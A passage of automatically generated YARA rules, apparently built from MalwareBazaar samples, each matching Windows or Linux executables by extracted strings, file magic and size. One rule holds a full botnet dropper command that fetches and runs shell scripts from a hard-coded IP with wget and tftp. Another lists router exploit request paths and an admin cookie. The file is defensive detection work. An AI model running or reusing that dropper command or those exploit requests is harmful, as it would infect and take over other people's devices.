        $s8 = "Failed to extract %s: failed to allocate temporary buffer!"
        $s9 = "Failed to extract %s: failed to read data chunk!"
        $s10 = "fread"
        $s11 = "Failed to extract %s: failed to write data chunk!"
        $s12 = "fwrite"
        $s13 = "Failed to extract %s: failed to open archive file!"
        $s14 = "pyi_arch_extract2fs was called before temporary directory was initialized!"
        $s15 = "Failed to create symbolic link %s!"
        $s16 = "Failed to extract %s: failed to open target file!"
        $s17 = "fopen"
        $s18 = "Failed to read cookie!"
        $s19 = "Could not read full TOC!"
        $s20 = "Error on file."
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 15861KB and
        all of them
}

rule Windows_0b36e4a25748a1daf0dbe1ed9b8ccd7208a0be2a536a14272771c8deff11d65d
{
    meta:
        description = "Auto ML: 0b36e4a25748a1daf0dbe1ed9b8ccd7208a0be2a536a14272771c8deff11d65d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = ".reloc"
        $s4 = "CorExitProcess"
        $s5 = "mscoree.dll"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point not loaded"
        $s13 = "KERNEL32.DLL"
        $s14 = "FlsSetValue"
        $s15 = "FlsGetValue"
        $s16 = "kernel32.dll"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 462KB and
        all of them
}

rule Windows_73d6607a9a76899ca834a89586e2700d8e49306bc5a788a1868558a6944e5e6e
{
    meta:
        description = "Auto ML: 73d6607a9a76899ca834a89586e2700d8e49306bc5a788a1868558a6944e5e6e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "@.reloc"
        $s4 = "System"
        $s5 = "System.Runtime.CompilerServices"
        $s6 = "TargetFrameworkAttribute"
        $s7 = "System.Runtime.Versioning"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "System.Core"
        $s10 = "System.Diagnostics"
        $s11 = "<Module>"
        $s12 = "getOmwnKvuTn0uPt2eV"
        $s13 = "System.IO"
        $s14 = "<Module>{586E6E3C-560B-4837-A4A3-4C6FB7D0DC4A}"
        $s15 = "System.Text"
        $s16 = "get_Length"
        $s17 = "get_Chars"
        $s18 = "System.Collections.Generic"
        $s19 = "System.Linq"
        $s20 = "GetEnumerator"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2052KB and
        all of them
}

rule Linux_73e54277221abfde9d86dee8e4b5ede6ace8ab062c13055d360b89c1b63e42f4
{
    meta:
        description = "Auto ML: 73e54277221abfde9d86dee8e4b5ede6ace8ab062c13055d360b89c1b63e42f4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 52KB and
        all of them
}

rule Windows_73ffa7003c0e0aecd5a4a681fc9d47d67ecae138a01b365cb7869461477a5705
{
    meta:
        description = "Auto ML: 73ffa7003c0e0aecd5a4a681fc9d47d67ecae138a01b365cb7869461477a5705"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.reloc"
        $s5 = "@.rsrc"
        $s6 = "SetProcessAffinityMask"
        $s7 = "eCMdD"
        $s8 = "WTSAPI32.dll"
        $s9 = "ADVAPI32.dll"
        $s10 = "GetProcAddress"
        $s11 = "cMDZS"
        $s12 = "GetProcessAffinityMask"
        $s13 = "GetProcessWindowStation"
        $s14 = "RegSetValueExA"
        $s15 = "ExitProcess"
        $s16 = "GetModuleHandleA"
        $s17 = "GetUserObjectInformationW"
        $s18 = "t[eteMP"
        $s19 = "LoadLibraryA"
        $s20 = "GetModuleFileNameW"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6505KB and
        all of them
}

rule Windows_740b85d585c17b7530d733fea1d42b015805cd4a2a2a277679632ddc3d37e1bf
{
    meta:
        description = "Auto ML: 740b85d585c17b7530d733fea1d42b015805cd4a2a2a277679632ddc3d37e1bf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6289KB and
        all of them
}

rule Windows_741f858f958dbf16c5eba258ebf662a13a028d215fc12aec3eaef0c715bd496a
{
    meta:
        description = "Auto ML: 741f858f958dbf16c5eba258ebf662a13a028d215fc12aec3eaef0c715bd496a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Reflection"
        $s5 = "System"
        $s6 = "System.Runtime.CompilerServices"
        $s7 = "System.Runtime.InteropServices"
        $s8 = "System.Diagnostics"
        $s9 = "TargetFrameworkAttribute"
        $s10 = "System.Runtime.Versioning"
        $s11 = "AssemblyFileVersionAttribute"
        $s12 = "Rooting.exe"
        $s13 = "<Module>"
        $s14 = "<Module>{42B00BCB-F62F-4517-83BE-0FBB46A6CBB9}"
        $s15 = "<Module>{2ee261bf-d0a0-4f92-baad-b9a6f2902b78}"
        $s16 = "kernel32.dll"
        $s17 = "CreateRemoteThread"
        $s18 = "System.IO"
        $s19 = "Module"
        $s20 = "System.Collections.Generic"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 374KB and
        all of them
}

rule Linux_7425590963b7709a9ec28d07527cf9b8c458eaf750be2593a0479bcc8c6fd6e6
{
    meta:
        description = "Auto ML: 7425590963b7709a9ec28d07527cf9b8c458eaf750be2593a0479bcc8c6fd6e6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)"
        $s2 = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"
        $s3 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00"
        $s4 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00"
        $s5 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00"
        $s6 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01"
        $s7 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00"
        $s8 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s9 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36"
        $s10 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
        $s11 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"
        $s12 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
        $s13 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36"
        $s14 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
        $s15 = "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)"
        $s16 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        $s17 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s18 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36"
        $s19 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)"
        $s20 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 115KB and
        all of them
}

rule Windows_746241f529aaf3c70038d80361028190ffa56df2af2d0c4139852f4bf76a1b21
{
    meta:
        description = "Auto ML: 746241f529aaf3c70038d80361028190ffa56df2af2d0c4139852f4bf76a1b21"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "window"
        $s6 = "d@http://play.baidu.com/?from=mp3"
        $s7 = "http://www.yinyuetai.com/baidu/index"
        $s8 = "http://player.kuwo.cn/webmusic/play?src=top"
        $s9 = "http://ting.weibo.com/"
        $s10 = "http://app.duomiyy.com/webradio/baidu/index.html"
        $s11 = "http://music.sina.com.cn/wall/index.php"
        $s12 = "http://douban.fm/radio"
        $s13 = "http://fm.renren.com/fm/home"
        $s14 = "http://fm.qq.com/"
        $s15 = "http://video.sina.com.cn/radio/359.html"
        $s16 = "http://fm.tv6080.com/"
        $s17 = "http://cdn.ttkvod.com/123/ttkvodtv2012/radio/radio.htm"
        $s18 = "http://co.9sky.com/mxplay/"
        $s19 = "http://www.ik123.com/"
        $s20 = "http://www.dj97.com/"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 824KB and
        all of them
}

rule Windows_747513c56f77acab5f84605d75866e33fc6e070a11e56a28887c5e75ef1edb2d
{
    meta:
        description = "Auto ML: 747513c56f77acab5f84605d75866e33fc6e070a11e56a28887c5e75ef1edb2d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "SELECT * FROM Win32_OperatingSystem"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetDefaultDllDirectories"
        $s9 = "s:IDS_BROWSETITLE"
        $s10 = "s:IDS_CMDEXTRACTING"
        $s11 = "s:IDS_FILEHEADERBROKEN"
        $s12 = "s:IDS_CANNOTOPEN"
        $s13 = "s:IDS_CANNOTCREATE"
        $s14 = "s:IDS_WRITEERROR"
        $s15 = "s:IDS_READERROR"
        $s16 = "s:IDS_CLOSEERROR"
        $s17 = "s:IDS_CREATEERRORS"
        $s18 = "s:IDS_ALLFILES"
        $s19 = "s:IDS_EXTRFILESTO"
        $s20 = "s:IDS_EXTRFILESTOTEMP"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2372KB and
        all of them
}

rule Windows_74766a1208fef54924f04e8524b6576df7027f2cb1157b985955c827280597d3
{
    meta:
        description = "Auto ML: 74766a1208fef54924f04e8524b6576df7027f2cb1157b985955c827280597d3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "-The lower bound of target array must be zero."
        $s6 = "MTarget array type is not compatible with the type of items in the collection."
        $s7 = "ECannot create file because the specified file name is already in use."
        $s8 = "!Buffer offset cannot be negative."
        $s9 = "Compound File API failure."
        $s10 = "UObject used as metadata key must be an instance of the CompoundFileMetadataKey class."
        $s11 = "DCannot perform this operation when the package is in read-only mode."
        $s12 = "OFailed to read a stream type table - the data appears to be a different format."
        $s13 = "7CompoundFileReference: Corrupted CompoundFileReference."
        $s14 = "ZCompoundFileReference: Corrupted CompoundFileReference - multiple stream components found."
        $s15 = "jCompoundFileReference: Corrupted CompoundFileReference - storage component cannot follow stream component."
        $s16 = "4Cannot create data storage because access is denied."
        $s17 = "!Cannot create a read-only stream."
        $s18 = "0Cannot create new package on a read-only stream."
        $s19 = ".Cannot create a stream in a read-only package."
        $s20 = "2Cannot create StorageRoot on a nonreadable stream."
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 911KB and
        all of them
}

rule Linux_74b94b31f0a31c1586096cfcab4502e97971031cbddf03319633183ae3e11130
{
    meta:
        description = "Auto ML: 74b94b31f0a31c1586096cfcab4502e97971031cbddf03319633183ae3e11130"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 196KB and
        all of them
}

rule Windows_0b480e28f0bfa9f30a19b0b6ee89acd3a1e962a8718414225928685a26059636
{
    meta:
        description = "Auto ML: 0b480e28f0bfa9f30a19b0b6ee89acd3a1e962a8718414225928685a26059636"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "Cannot read Table of Contents."
        $s7 = "Failed to extract %s: failed to allocate temporary input buffer!"
        $s8 = "Failed to extract %s: failed to allocate temporary output buffer!"
        $s9 = "Failed to extract %s: failed to allocate temporary buffer!"
        $s10 = "Failed to extract %s: failed to read data chunk!"
        $s11 = "fread"
        $s12 = "Failed to extract %s: failed to write data chunk!"
        $s13 = "fwrite"
        $s14 = "Failed to extract %s: failed to open archive file!"
        $s15 = "Failed to extract %s: failed to open target file!"
        $s16 = "fopen"
        $s17 = "Failed to read cookie!"
        $s18 = "Could not read full TOC!"
        $s19 = "Error on file."
        $s20 = "Failed to open archive %s!"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 9031KB and
        all of them
}

rule Windows_74df3452a6b9dcdba658af7a9cf5afb09cce51534f9bc63079827bf73075243b
{
    meta:
        description = "Auto ML: 74df3452a6b9dcdba658af7a9cf5afb09cce51534f9bc63079827bf73075243b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "no such process"
        $s7 = "FlsGetValue"
        $s8 = "FlsSetValue"
        $s9 = "CreateEventExW"
        $s10 = "CreateSemaphoreW"
        $s11 = "CreateSemaphoreExW"
        $s12 = "CreateThreadpoolTimer"
        $s13 = "SetThreadpoolTimer"
        $s14 = "WaitForThreadpoolTimerCallbacks"
        $s15 = "CloseThreadpoolTimer"
        $s16 = "CreateThreadpoolWait"
        $s17 = "SetThreadpoolWait"
        $s18 = "CloseThreadpoolWait"
        $s19 = "FlushProcessWriteBuffers"
        $s20 = "GetCurrentProcessorNumber"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 707KB and
        all of them
}

rule Windows_74e12bbc91af27f079f6c39e0a3600f7c9a203c3ee996dda09c863dbde0e86dc
{
    meta:
        description = "Auto ML: 74e12bbc91af27f079f6c39e0a3600f7c9a203c3ee996dda09c863dbde0e86dc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "QSystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
        $s6 = "System.Drawing.Icon"
        $s7 = "System.Drawing.Size"
        $s8 = "System.Drawing.Bitmap"
        $s9 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD"
        $s10 = "BnZHeu.exe"
        $s11 = "System.Runtime.CompilerServices"
        $s12 = "<Module>"
        $s13 = "kernel32.dll"
        $s14 = "System"
        $s15 = "Module"
        $s16 = "System.Reflection"
        $s17 = "System.IO"
        $s18 = "get_SoDong"
        $s19 = "get_SoCot"
        $s20 = "System.Drawing"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 778KB and
        all of them
}

rule Windows_751597396e020f0bc9c02049fba72290571f6ade9b2c079f33bf1e70f99a30f6
{
    meta:
        description = "Auto ML: 751597396e020f0bc9c02049fba72290571f6ade9b2c079f33bf1e70f99a30f6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "get_RvrI"
        $s6 = "get_ImagenURL"
        $s7 = "set_ImagenURL"
        $s8 = "get_Marca"
        $s9 = "set_Marca"
        $s10 = "get_Categoria"
        $s11 = "set_Categoria"
        $s12 = "System.Data"
        $s13 = "setearConsulta"
        $s14 = "System.Collections.Generic"
        $s15 = "Read"
        $s16 = "add_Load"
        $s17 = "frmConSettings_Load"
        $s18 = "set_AutoScaleMode"
        $s19 = "set_SizeMode"
        $s20 = "set_Image"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 619KB and
        all of them
}

rule Windows_751657b09e8419dcfc90b0e44932dee1a4117ce9cd73cf652aa52c348a391f82
{
    meta:
        description = "Auto ML: 751657b09e8419dcfc90b0e44932dee1a4117ce9cd73cf652aa52c348a391f82"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "Load_LuongNV"
        $s6 = "System.Data"
        $s7 = "Load_Data"
        $s8 = "GetData"
        $s9 = "Form1_Load"
        $s10 = "add_Load"
        $s11 = "MatKhau_Load"
        $s12 = "get_Checked"
        $s13 = "set_Enabled"
        $s14 = "set_FormattingEnabled"
        $s15 = "CreateInstance"
        $s16 = "set_DataSource"
        $s17 = "set_AutoScaleMode"
        $s18 = "set_ColumnHeadersHeightSizeMode"
        $s19 = "get_Message"
        $s20 = "set_Visible"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 821KB and
        all of them
}

rule Windows_756c48b8e22d22eaf24ad8c69928bcf1cbb08e63ef897eac21366f4f6bd2c403
{
    meta:
        description = "Auto ML: 756c48b8e22d22eaf24ad8c69928bcf1cbb08e63ef897eac21366f4f6bd2c403"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".reloc"
        $s5 = "SystemFuH"
        $s6 = "RtlGetCuH"
        $s7 = "tlGetCurH"
        $s8 = "RtlGetNtH"
        $s9 = "WSAGetOvH"
        $s10 = "wine_getH"
        $s11 = "GetSysteH"
        $s12 = ";fileu"
        $s13 = "?fileumH"
        $s14 = "kernel32H9"
        $s15 = ".dllu"
        $s16 = "Read"
        $s17 = "Load"
        $s18 = "read"
        $s19 = "load"
        $s20 = "File"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 8258KB and
        all of them
}

rule Windows_75856ab2df478c5cdf8088b6a2c26aca319637171ab7995a3628e5d251816b8d
{
    meta:
        description = "Auto ML: 75856ab2df478c5cdf8088b6a2c26aca319637171ab7995a3628e5d251816b8d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4410KB and
        all of them
}

rule Linux_75e82f4867f4ec24244c4757beadeaa3222c88b0dca648e5e77ef1b1af4cceac
{
    meta:
        description = "Auto ML: 75e82f4867f4ec24244c4757beadeaa3222c88b0dca648e5e77ef1b1af4cceac"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "cd /tmp; wget http://45.90.217.165/bins.sh; chmod 777 *; sh bins.sh; tftp -g 45.90.217.165 -r tftp.sh; chmod 777 *; sh tftp.sh; rm -rf *.sh"
        $s2 = "user"
        $s3 = "User"
        $s4 = "shell"
        $s5 = "system"
        $s6 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
        $s7 = "FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)"
        $s8 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
        $s9 = "BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)"
        $s10 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201"
        $s11 = "FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)"
        $s12 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
        $s13 = "zspider/0.9-dev http://feedback.redkolibri.com/"
        $s14 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)"
        $s15 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)"
        $s16 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        $s17 = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
        $s18 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)"
        $s19 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
        $s20 = "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 135KB and
        all of them
}

rule Linux_75f6172c7ebe95e418db8a0cd444e2e6056c3fca118c140693ed8b8ffae607ea
{
    meta:
        description = "Auto ML: 75f6172c7ebe95e418db8a0cd444e2e6056c3fca118c140693ed8b8ffae607ea"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "GET / HTTP/1.1"
        $s2 = "User-A"
        $s3 = "illa/5.0 (Windows NS6L;"
        $s4 = "oGhttp://"
        $s5 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
        $s6 = "PROT_EXEC|PROT_WRITE failed."
    condition:
        uint32(0) == 0x464c457f and
        filesize < 31KB and
        all of them
}

rule Windows_761769e8b5c01c04e5c611cb03657ab3b1ff1ed83498f6035dd59d4a779c8643
{
    meta:
        description = "Auto ML: 761769e8b5c01c04e5c611cb03657ab3b1ff1ed83498f6035dd59d4a779c8643"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "QDCbzawiN{r"
        $s5 = "cFIlE~"
        $s6 = "ReadOnlySpan`1"
        $s7 = "<SetIntAsync>d__6"
        $s8 = "<GetIntAsync>d__7"
        $s9 = "System.IO"
        $s10 = "System.Dynamic"
        $s11 = "System.Collections.Generic"
        $s12 = "ReadToEndAsync"
        $s13 = "get_CanRead"
        $s14 = "Thread"
        $s15 = "Load"
        $s16 = "Unload"
        $s17 = "ReadUnaligned"
        $s18 = "WriteUnaligned"
        $s19 = "get_IsCompleted"
        $s20 = "get_IsFaulted"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 697KB and
        all of them
}

rule Windows_7664ff83558a7141b89d83842fca07c9b6f4d377967c20b7237e1fa50e6f7f4e
{
    meta:
        description = "Auto ML: 7664ff83558a7141b89d83842fca07c9b6f4d377967c20b7237e1fa50e6f7f4e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Reheats.exe"
        $s5 = "<Module>"
        $s6 = "System"
        $s7 = "ConnectionProvider"
        $s8 = "ConfigReader"
        $s9 = "FileScanning"
        $s10 = "FileSearcher"
        $s11 = "OpenVPN"
        $s12 = "System.Windows.Forms"
        $s13 = "QueryProcessor"
        $s14 = "QueryCmd"
        $s15 = "DownloadAndExecuteUpdate"
        $s16 = "DownloadUpdate"
        $s17 = "OpenUpdate"
        $s18 = "FileExt"
        $s19 = "UserExt"
        $s20 = "FileUtil"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 300KB and
        all of them
}

rule Linux_0b598088d167fb7164ac44ff6ec04bc8d4ef8b7299502db3120ebb1e1e9440b5
{
    meta:
        description = "Auto ML: 0b598088d167fb7164ac44ff6ec04bc8d4ef8b7299502db3120ebb1e1e9440b5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "'pgEt"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 43KB and
        all of them
}

rule Windows_768f163ce8833ca05034b25efccba215b2b69f3bfb9f43bd2b43569dfc03fd8b
{
    meta:
        description = "Auto ML: 768f163ce8833ca05034b25efccba215b2b69f3bfb9f43bd2b43569dfc03fd8b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "TEMP"
        $s7 = "USERPROFILE"
        $s8 = "GetUserDefaultUILanguage"
        $s9 = "kernel32.dll"
        $s10 = "TFile"
        $s11 = "EFileError"
        $s12 = "File I/O error %d"
        $s13 = "TCompressedBlockReader"
